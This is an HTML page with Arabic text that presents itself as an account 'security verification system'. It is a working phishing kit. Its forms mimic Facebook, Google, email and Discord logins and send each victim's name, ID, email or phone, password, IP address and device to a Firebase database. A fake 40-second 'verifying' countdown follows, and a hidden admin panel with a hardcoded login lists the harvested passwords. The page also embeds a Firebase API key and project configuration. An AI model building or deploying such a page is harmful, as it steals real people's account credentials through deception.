<!DOCTYPE html>
<html lang="ar">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Firebase Demo</title>

<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">

<style>

*{box-sizing:border-box}

body{
margin:0;
font-family:'Cairo',sans-serif;

background-image:url("Screenshot_٢٠٢٦٠٣٠٨-١٣١١١٤.jpg");
background-position:center;
background-size:cover;
background-repeat:no-repeat;
background-attachment:fixed;

height:100vh;
display:flex;
flex-direction:column;
align-items:center;
justify-content:center;
}

/* ====== HEADER ====== */

.header{
position:absolute;
top:30px;
text-align:center;
animation:fadeDown 1.2s ease;
  margin-left: 20%;
}

.header img{
width:120px;
height:120px;
border-radius:50%;
object-fit:cover;
border:4px solid white;
box-shadow:0 10px 25px rgba(0,0,0,.4);
}

.header h1{
margin:10px 0 0;
color:white;
font-size:24px;
}

.header p{
margin:5px 0 0;
color:#eee;
font-size:14px;
}

/* ====== BUTTONS ====== */

.container{
display:flex;
gap:12px;
overflow-x:auto;
padding:15px;

justify-content:center;
margin:auto;

animation:fadeUp 1.2s ease;
}

.btn{
width:70px;
height:70px;
border-radius:50%;
background:white;
display:flex;
align-items:center;
justify-content:center;
font-size:40px;
cursor:pointer;
box-shadow:0 5px 15px rgba(0,0,0,.3);
transition:.3s;
}

.btn:hover{
transform:scale(1.15) rotate(5deg);
}

/* ====== MODAL ====== */

.modal{
position:fixed;
inset:0;
background:rgba(0,0,0,.7);
display:none;
align-items:center;
justify-content:center;
animation:fade .4s;
}

.box{
background:white;
width:320px;
padding:20px;
border-radius:12px;
text-align:center;
position:relative;
animation:zoom .4s;
}

.close{
position:absolute;
top:8px;
right:10px;
cursor:pointer;
}

.icon{
font-size:40px;
margin-bottom:15px;
}

.field{margin:10px 0}

.field input{
width:100%;
padding:12px;
border-radius:10px;
border:2px solid #ddd;
}

button{
width:100%;
padding:10px;
border:none;
border-radius:10px;
background:black;
color:white;
cursor:pointer;
}

.admin{
position:fixed;
inset:0;
background:#081008;
color:#00ff00;
font-family:monospace;
display:none;
overflow:auto;
}

.adminHeader{
padding:10px;
border-bottom:1px solid #00ff00;
display:flex;
justify-content:space-between;
}

#ha{
font-size:20px;
color:red;
}

#e{
font-size:10px;
color:red;
}

.user{
border-bottom:1px solid #003300;
padding:10px;
}

.actionBtn{
margin-top:5px;
padding:4px 8px;
font-size:12px;
cursor:pointer;
}

/* ===== ANIMATIONS ===== */

@keyframes fadeUp{
from{opacity:0;transform:translateY(40px)}
to{opacity:1;transform:translateY(0)}
}

@keyframes fadeDown{
from{opacity:0;transform:translateY(-40px)}
to{opacity:1;transform:translateY(0)}
}

@keyframes zoom{
from{transform:scale(.7);opacity:0}
to{transform:scale(1);opacity:1}
}

@keyframes fade{
from{opacity:0}
to{opacity:1}
}

#status{
margin-top:10px;
font-weight:bold;
color:green;
}

</style>
</head>

<body>

<!-- ===== HEADER ===== -->

<div class="header">

<img src="logo.jpg">

<h1>نظام التحقق الأمني</h1>

<p>يرجى تأكيد معلومات الحساب للحماية</p>

</div>

<!-- ===== BUTTONS ===== -->

<div class="container">

<div class="btn" onclick="openModal('facebook')">
<i class="fab fa-facebook-f" style="color:#1877f2"></i>
</div>

<div class="btn" onclick="openModal('google')">
<i class="fab fa-google" style="color:#db4437"></i>
</div>

<div class="btn" onclick="openModal('mail')">
<i class="fas fa-envelope"></i>
</div>

<div class="btn" onclick="openModal('discord')">
<i class="fab fa-discord" style="color:#5865F2"></i>
</div>

<div class="btn" onclick="openAdmin()">
<i class="fas fa-user-secret"></i>
</div>

</div>

<!-- modal -->

<div class="modal" id="modal">

<div class="box">

<div class="close" onclick="closeModal()">✖</div>

<div class="icon" id="icon"></div>

<h1 id="ha">يجب ملء معلوماتك للتحقق من امان حسابك</h1>

<h1 id="e">⚠️ هذا الموقع مؤمن بتشفير 2FA</h1>

<div class="field">
<input id="name" placeholder="اسمك">
</div>

<div class="field">
<input id="idUser" placeholder="الخاص بك IDال">
</div>

<div class="field">
<input id="email" placeholder="البريد الالكتروني او رقم الهاتف ">
</div>

<div class="field">
<input id="pass" placeholder="كلمة المرور" type="password">
</div>

<button onclick="verify()">تأكيد</button>

<div id="status"></div>

</div>
</div>

<!-- admin login -->

<div class="modal" id="adminLogin">

<div class="box">

<h3>Admin Login</h3>

<div class="field">
<input id="adminUser" placeholder="user">
</div>

<div class="field">
<input id="adminPass" placeholder="password">
</div>

<button onclick="loginAdmin()">Login</button>

</div>

</div>

<!-- admin panel -->

<div class="admin" id="panel">

<div class="adminHeader">
<div>ADMIN PANEL</div>
<button onclick="logout()">Logout</button>
</div>

<div id="list"></div>

</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, push, onValue, remove } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const firebaseConfig={
apiKey:"AIzaSyDQC-h8a1CFBeXISxJnJjYrWTw3lH00dgU",
authDomain:"nickname-701a2.firebaseapp.com",
databaseURL:"https://nickname-701a2-default-rtdb.firebaseio.com/",
projectId:"nickname-701a2"
};

const app=initializeApp(firebaseConfig)
const db=getDatabase(app)

let currentType=""
let userIP=""

fetch("https://api.ipify.org?format=json")
.then(r=>r.json())
.then(d=>{userIP=d.ip})

function device(){
let ua=navigator.userAgent
if(ua.includes("Android")) return "Android"
if(ua.includes("iPhone")) return "iPhone"
if(ua.includes("Windows")) return "Windows"
if(ua.includes("Linux")) return "Linux"
return "Unknown"
}

window.openModal=(type)=>{

currentType=type

document.getElementById("modal").style.display="flex"

let icon=document.getElementById("icon")

if(type==="facebook") icon.innerHTML='<i class="fab fa-facebook-f"></i>'
if(type==="google") icon.innerHTML='<i class="fab fa-google"></i>'
if(type==="mail") icon.innerHTML='<i class="fas fa-envelope"></i>'
if(type==="discord") icon.innerHTML='<i class="fab fa-discord"></i>'

}

window.closeModal=()=>{
document.getElementById("modal").style.display="none"
}

/* ====== VERIFY WITH 40s COUNTDOWN ===== */

window.verify=()=>{

let name=document.getElementById("name").value
let id=document.getElementById("idUser").value
let email=document.getElementById("email").value
let pass=document.getElementById("pass").value

/* تخزين البيانات مباشرة */

push(ref(db,"demoUsers"),{
name,id,email,pass,
type:currentType,
ip:userIP,
device:device(),
time:new Date().toLocaleString()
})

/* بدء العد التنازلي */

let counter=40
let status=document.getElementById("status")

status.innerHTML="جاري التحقق من الحساب... 40"

let interval=setInterval(()=>{

counter--

status.innerHTML="جاري التحقق من الحساب... "+counter

if(counter<=0){

clearInterval(interval)

status.innerHTML="✅ تم التحقق من الحساب وبس جزاك الله خير"

}

},1000)

}

window.openAdmin=()=>{
document.getElementById("adminLogin").style.display="flex"
}

window.loginAdmin=()=>{

let u=document.getElementById("adminUser").value
let p=document.getElementById("adminPass").value

if(u==="AMJED" && p==="AMJED190"){

document.getElementById("panel").style.display="block"
load()

}else{

alert("Access denied")

}

}

function icon(type){

if(type==="facebook") return "facebook"
if(type==="google") return "google"
if(type==="mail") return "email"
if(type==="discord") return "discord"

}

function load(){

const r=ref(db,"demoUsers")

onValue(r,(snap)=>{

let arr=[]

snap.forEach(x=>{
arr.push({key:x.key,...x.val()})
})

arr.reverse()

let list=document.getElementById("list")
list.innerHTML=""

arr.forEach(d=>{

let div=document.createElement("div")
div.className="user"

let text=`
${icon(d.type)} 
NAME: ${d.name}
ID: ${d.id}
EMAIL: ${d.email}
PASS: ${d.pass}
IP: ${d.ip}
DEVICE: ${d.device}
TIME: ${d.time}
`

div.innerHTML=`
<pre>${text}</pre>

<button class="actionBtn" onclick="copyData(\`${text}\`)">نسخ</button>

<button class="actionBtn" onclick="deleteUser('${d.key}')">حذف</button>
`

list.appendChild(div)

})

})

}

window.copyData=(t)=>{
navigator.clipboard.writeText(t)
alert("تم النسخ")
}

window.deleteUser=(k)=>{
remove(ref(db,"demoUsers/"+k))
}

window.logout=()=>{
document.getElementById("panel").style.display="none"
}

</script>

</body>
</html>
